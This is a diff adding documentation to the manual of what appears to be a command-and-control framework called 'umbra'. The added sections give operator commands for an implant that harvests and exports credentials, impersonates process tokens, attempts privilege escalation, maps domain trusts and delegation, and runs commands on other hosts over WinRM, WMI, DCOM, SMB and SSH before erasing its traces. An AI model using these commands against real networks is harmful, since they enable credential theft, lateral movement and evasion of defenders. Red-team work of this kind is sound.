@@ -313,6 +313,86 @@ cleaned as well: the implant can run under a copied name, in a plausible
 directory, with an environment that says nothing about the tool, and — on
 Windows — with the parent it claims to have.
 
+### The material and the vault
+
+Everything the implant finds about an identity is a record: a kind, a
+source, an account, a target and a confidence.  The value of the material
+only leaves the host when the operator asks for it, and it only leaves the
+server when the operator asks for that.
+
+```bash
+umbra task web-01 --kind creds --args '{"mode":"all"}'     # the shape of the material
+umbra task web-01 --kind creds --args '{"mode":"all","raw":true}'
+umbra creds-list                                        # the vault of the engagement
+umbra creds-list --kind hash --agent web-01
+umbra creds-search svc-sql01                           # search the account, the target and the note
+umbra creds-export --kind password                     # the value (operator role)
+```
+
+The rules are short:
+
+* The **event stream never carries a secret**.  The task record and the
+  `creds.collected` event keep the shape of the material; the value goes to
+  the vault.
+* The vault is **encrypted at rest** when the server has a key.  Set
+  `vault_key` in the configuration, or `UMBRA_VAULT_KEY` in the
+  environment.  Without a key the server keeps the digest and drops the
+  value: an operator still sees what was found and where, but the value is
+  not kept anywhere.
+* The **digest is always kept**, so two hosts that share a credential can
+  be seen to share it without the key.
+* `creds-export` is an **operator** action, and the console asks for the
+  value only when the operator asked for it.
+
+**The token work.**
+
+```bash
+umbra task web-01 --kind token --args '{"mode":"list"}'
+umbra task web-01 --kind token --args '{"mode":"list","session":1}'
+umbra task web-01 --kind token --args '{"mode":"impersonate","pid":1180}'
+umbra task web-01 --kind token --args '{"mode":"become","pid":1180}'
+umbra task web-01 --kind token --args '{"mode":"restore"}'
+```
+
+`impersonate` borrows the account of a process for the next task and gives
+it back when the task is done; `become` keeps it until the operator sends
+`restore`.  The identity travels with the check-in, so the inventory shows
+the truth, and the server drops it when the session of the agent ends.
+
+**The privilege escalation.**  Every attempt is reported on its own — the
+technique, the outcome and what it changed on the host:
+
+```bash
+umbra task web-01 --kind privesc --args '{"mode":"privileges"}'
+umbra task web-01 --kind privesc --args '{"mode":"token"}'
+```
+
+**The domain.**  The reconnaissance now carries the edges that matter for
+movement: the trusts of the domain, the accounts that may delegate, the
+groups and their members, the machine accounts, and the permissions that
+give a principal the full control, the right to write the permissions or
+the right to replicate the directory.
+
+### Running a command on a far host
+
+The implant does not need a new tunnel to reach a far host: the agent that
+holds the network path runs the command there, with its own credentials and
+its own reach.  The output comes back through that same agent.
+
+```bash
+umbra task pivot-01 --kind winrm.exec --args '{"target":"dc01","command":"whoami"}'
+umbra task pivot-01 --kind wmi.exec   --args '{"target":"dc01","command":"net user"}'
+umbra task pivot-01 --kind dcom.exec  --args '{"target":"web01","command":"ipconfig"}'
+umbra task pivot-01 --kind smb.exec   --args '{"target":"web01","command":"hostname"}'
+umbra task pivot-01 --kind ldap.query --args '{"target":"dc01","command":"user"}'
+umbra task pivot-01 --kind ssh.exec   --args '{"target":"10.0.0.9","command":"id","user":"root"}'
+```
+
+Every one of them cleans up after itself: the remote file, the remote task
+and the remote service are removed as soon as the output has been read.  The
+protocol that does not return the output itself (`wmi`, `dcom`, `smb`) reads
+it back over the administrative share of the target.
+
 ### Keeping the implant reachable
 
 The beacon can know more than one address of the team server:
